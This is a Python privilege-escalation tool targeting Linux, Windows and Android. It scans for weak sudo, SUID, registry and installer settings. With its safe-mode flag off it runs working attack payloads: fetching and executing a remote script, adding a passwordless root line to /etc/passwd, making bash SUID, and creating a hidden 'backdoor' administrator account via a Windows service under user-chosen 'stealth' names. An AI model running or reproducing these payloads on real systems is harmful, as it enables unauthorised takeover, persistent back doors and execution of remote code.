import os
import subprocess
import platform
import random
import string
import sys

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

SAFE_MODE = True # this will prevent exploits from auto running
CUSTOM_NAME = True 

def run_command(command):
    # run shell command and return output
    try:
        return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,text=True).strip()
    except subprocess.CalledProcessError:
        return ""

def banner():
    print(f"""
    {GREEN}██████╗ ██╗   ██╗███████╗███████╗
    ██╔══██╗██║   ██║██╔════╝██╔════╝
    ██████╔╝██║   ██║███████╗███████╗
    ██╔═══╝ ██║   ██║╚════██║╚════██║
    ██║     ╚██████╔╝███████║███████║
    ╚═╝      ╚═════╝ ╚══════╝╚══════╝
    
    {YELLOW}🔥 Multi-Platform Privilege Escalation Tool 🔥{RESET}
    """)

# linux prev..esc
def check_sudo():
    print(f"{YELLOW}[*] Checking sudo permissions...{RESET}")
    output=run_command("sudo -l")
    if "NOPASSWD" in output:
        print(f"{GREEN}[+] Sudo misconfiguration found!{RESET}")
        if not SAFE_MODE:
            os.system("sudo bash")
    else:
        print(f"{RED}[-] No sudo misconfigurations found.{RESET}")

def check_suid():
     print(f"{YELLOW}[*] Checking for SUID binaries...{RESET}")
     output=run_command("find / -perm -4000 -type f 2>/dev/null")
     if output:
         print(f"{GREEN}[+] SUID binaries found:{RESET}\n{output}")
     else:
        print(f"{RED}[-] No SUID binaries found.{RESET}")

def check_kernel_exploits():
    print(f"{YELLOW}[*] Checking for kernel exploits...{RESET}")
    kernel_version=run_command("uname -r").strip()
    known_vulns = {
        "5.8": "Dirty Pipe (CVE-2022-0847)",
        "4.4": "Dirty Cow (CVE-2016-5195)"
    }
    for version,exploit in known_vulns.items():
        if version in kernel_version:
            print(f"{GREEN}[+] Kernel Exploit Available: {exploit}{RESET}")
            if not SAFE_MODE:
                exploit_payload = f"""
                wget exploit.com/{version}.sh
                chmod +x {version}.sh
                ./{version}.sh
                """
                os.system(exploit_payload)

# windows prev..esc
def check_unquoted_services():
    print(f"{YELLOW}[*] Checking for unquoted service paths...{RESET}")
    output=run_command("wmic service get name,displayname,pathname,startmode")
    if " " in output and not '"' in output:
        print(f"{GREEN}[+] Unquoted service path found!{RESET}")
    else:
        print(f"{RED}[-] No unquoted service paths found.{RESET}")

def check_always_install_elevated():
     print(f"{YELLOW}[*] Checking AlwaysInstallElevated policy...{RESET}")
     reg_check=run_command("reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated")
     if "0x1" in reg_check:
         print(f"{GREEN}[+] AlwaysInstallElevated is enabled! You can run MSI payloads as SYSTEM.{RESET}")
         if not SAFE_MODE:
             os.system("msiexec /quiet /qn /i payload.msi")
     else:
        print(f"{RED}[-] AlwaysInstallElevated not enabled.{RESET}")

def check_weak_registry():
    print(f"{YELLOW}[*] Checking for weak registry permissions...{RESET}")
    output=run_command("icacls C:\\Windows\\System32\\config\\SAM")
    if "Everyone:(F)" in output:
        print(f"{GREEN}[+] Weak registry permissions found!{RESET}")
    else:
        print(f"{RED}[-] No weak registry permissions found.{RESET}")

# android
def check_root():
    print(f"{YELLOW}[*] Checking for root access...{RESET}")
    output=run_command("su -c id")
    if "uid=0(root)" in output:
        print(f"{GREEN}[+] Device is rooted!{RESET}")
    else:
        print(f"{RED}[-] No root access detected.{RESET}")

def check_adb():
    print(f"{YELLOW}[*] Checking for open ADB...{RESET}")
    adb_status=run_command("adb devices")
    if "device" in adb_status:
        print(f"{GREEN}[+] ADB is enabled!{RESET}")
    else:
        print(f"{RED}[-] ADB is not enabled.{RESET}")

# exploitation
def exploit_linux():
    if CUSTOM_NAME:
        bin_name = input("[?] Enter stealth binary name (default: rootkit): ") or "rootkit"
    else:
        bin_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        
    exploit_script = f"""
    #!/bin/bash
    echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd
    chmod u+s /bin/bash
    """
    with open(bin_name,"w") as f:
        f.write(exploit_script)
    os.system(f"chmod +x {bin_name} && ./{bin_name}")
    print(f"[+] Exploit executed: {bin_name}")
    
def exploit_windows():
    if CUSTOM_NAME:
        service_name = input("[?] Enter stealth service name (default: stealth_svc): ") or "stealth_svc"
    else:
        service_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    
    exploit_script = f"""
    @echo off
    net user backdoor P@ssw0rd123 /add
    net localgroup Administrators backdoor /add
    sc create {service_name} binPath= "cmd.exe /c net user backdoor P@ssw0rd123 /add && net localgroup Administrators backdoor /add"
    sc start {service_name}
    """
    with open(f"{service_name}.bat","w") as f:
        f.write(exploit_script)
    os.system(f"cmd /c {service_name}.bat")
    print(f"[+] Exploit executed: {service_name}.bat")

def exploit_android():
    if CUSTOM_NAME:
        exploit_name = input("[?] Enter stealth exploit name (default: rootme): ") or "rootme"
    else:
        exploit_name = ''.join(random.choices(string.ascii_lowercase, k=8))

    exploit_script = f"""
    #!/bin/sh
    mount -o rw,remount /system
    echo 'root::0:0:root:/root:/bin/sh' >> /system/etc/passwd
    chmod 777 /system/bin/sh
    """

    with open(exploit_name, "w") as f:
        f.write(exploit_script)

    os.system(f"chmod +x {exploit_name} && ./{exploit_name}")
    print(f"[+] Exploit executed: {exploit_name}")
    
# main
def main():
    banner()
    os_type = platform.system()
    
    if os_type == "Linux":
        check_sudo()
        check_suid()
        check_kernel_exploits()
        if not SAFE_MODE:
            exploit_linux()
    
    elif os_type == "Windows":
        check_unquoted_services()
        check_always_install_elevated()
        check_weak_registry()
        if not SAFE_MODE:
            exploit_windows()

    elif "Android" in os_type:
        check_root()
        check_adb()
        if not SAFE_MODE:
            exploit_android()

if __name__ == "__main__":
    main()
